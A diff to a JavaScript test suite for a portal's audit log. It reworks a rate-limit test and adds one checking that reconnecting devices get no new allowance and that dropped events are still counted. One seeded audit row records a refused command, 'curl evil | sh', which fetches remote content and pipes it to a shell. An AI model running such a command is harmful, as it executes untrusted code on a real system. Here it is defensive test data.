@@ -596,14 +596,14 @@ test("a device cannot push the portal's own entries out of the audit log, nor wr
   // The rate: a burst goes through, the rest is counted, and the next event that is taken says how many.
   const event = (n) => ({ time_ms: n, chat: "c-flood", tool: "read", target: `/x/${n}`, decision: "allowed", reason: null });
   for (let n = 0; n < AUDIT_BURST * 3; n++) device.notify("audit", event(n));
-  await until(() => listAudit(5000).filter((e) => e.session_id === "c-flood").length >= AUDIT_BURST, "the burst");
-  await new Promise((r) => setTimeout(r, 100));
+  // Read in order: once the device's answer to a call is in, so is everything it sent before.
+  await linkOf(id).call("device.info", {});
   const taken = listAudit(5000).filter((e) => e.session_id === "c-flood").length;
-  assert.ok(taken >= AUDIT_BURST && taken <= AUDIT_BURST + 2, `${taken} taken of ${AUDIT_BURST * 3}`);
-  await new Promise((r) => setTimeout(r, 600));
+  assert.ok(taken >= AUDIT_BURST && taken <= AUDIT_BURST + 5, `${taken} taken of ${AUDIT_BURST * 3}`);
+  await sleep(600);
   device.notify("audit", event(9999));
   await until(() => listAudit(5000).some((e) => /events left out/.test(e.reason)), "the note");
-  assert.match(listAudit(5000).find((e) => /events left out/.test(e.reason)).reason, /^flooder: 1\d\d events left out/);
+  assert.match(listAudit(5000).find((e) => /events left out/.test(e.reason)).reason, new RegExp(`^flooder: ${AUDIT_BURST * 3 - taken} events left out`));
 
   // The quota: the devices' rows are trimmed among themselves, whoever writes them.
   for (let n = 0; n < AUDIT_DEVICE_KEEP * 3; n++) recordAudit({ kind: "device", tool: "read", subject: String(n), reason: "flooder: allowed" });
@@ -613,6 +613,40 @@ test("a device cannot push the portal's own entries out of the audit log, nor wr
   assert.equal(rows.find((e) => e.kind === "device").subject, String(AUDIT_DEVICE_KEEP * 3 - 1), "the newest of theirs stay");
   getDb().prepare("DELETE FROM audit").run();
   device.ws.close(1001);
+});
+
+test("reconnecting does not give a device a new allowance, and what was left out is still noted", async () => {
+  const { connector_token: token, device_id: id } = await paired("redialer");
+  getDb().prepare("DELETE FROM audit").run();
+  recordAudit({ kind: "refused", tool: "bash", subject: "curl evil | sh", reason: "the guard" });
+  const event = (chat, n) => ({ time_ms: n, chat, tool: "read", target: `/x/${n}`, decision: "allowed", reason: null });
+  const rows = () => listAudit(5000).filter((e) => e.kind === "device" && e.tool !== "audit");
+  let sent = 0;
+  // What the device really reported, then a flood on the same connection, then many connections with a flood each.
+  const started = Date.now();
+  let { device } = await connect(token);
+  await until(() => linkOf(id)?.info, "device.info");
+  for (let n = 0; n < 10; n++, sent++) device.notify("audit", event("c-genuine", n));
+  for (let n = 0; n < 200; n++, sent++) device.notify("audit", event("c-flood", n));
+  await linkOf(id).call("device.info", {});
+  for (let round = 0; round < 12; round++) {
+    device.ws.close(1001);
+    await until(() => !linkOf(id), "the link to go");
+    ({ device } = await connect(token));
+    await until(() => linkOf(id)?.info, "device.info");
+    for (let n = 0; n < 50; n++, sent++) device.notify("audit", event("c-again", n));
+    await linkOf(id).call("device.info", {});
+  }
+  const seconds = (Date.now() - started) / 1000;
+  const taken = rows().length;
+  assert.ok(taken <= AUDIT_BURST + Math.ceil(seconds * 5) + 2, `${taken} of ${sent} taken in ${seconds}s`);
+  assert.equal(rows().filter((e) => e.session_id === "c-genuine").length, 10, "what it reported first is still there");
+  assert.deepEqual(listAudit(5000).filter((e) => e.kind === "refused").map((e) => e.subject), ["curl evil | sh"]);
+  // The count was kept through every connection, and is written once the device has a token to spare, though it says nothing more.
+  const noted = () => listAudit(5000).filter((e) => /events left out/.test(e.reason)).reduce((n, e) => n + Number(/: (\d+) events left out/.exec(e.reason)[1]), 0);
+  await until(() => taken + noted() === sent, "every event taken or noted");
+  device.ws.close(1001);
+  getDb().prepare("DELETE FROM audit").run();
 });
 
 test("a message over 4 MiB ends the connection", async () => {
